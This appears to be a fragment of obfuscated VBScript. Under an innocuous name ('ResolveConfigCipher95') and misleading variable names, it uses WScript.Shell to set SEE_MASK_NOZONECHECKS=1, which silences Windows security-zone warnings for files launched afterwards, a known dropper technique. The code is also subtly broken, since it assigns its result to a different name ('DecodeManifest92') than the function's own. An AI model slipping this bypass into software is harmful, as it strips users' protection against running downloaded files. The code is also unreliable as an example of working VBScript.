Function ResolveConfigCipher95()
On Error Resume Next
  Dim blnEnabled2,strEntry20,strManifest33
  Set blnEnabled2=CreateObject("WScript.Shell")
  strEntry20=blnEnabled2.ExpandEnvironmentStrings("%TEMP%")
  strManifest33=blnEnabled2.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strEntry20)>0 And Len(strManifest33)>0 Then
    blnEnabled2.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    DecodeManifest92=1
    Exit Function
  End If
  DecodeManifest92=0
End Function

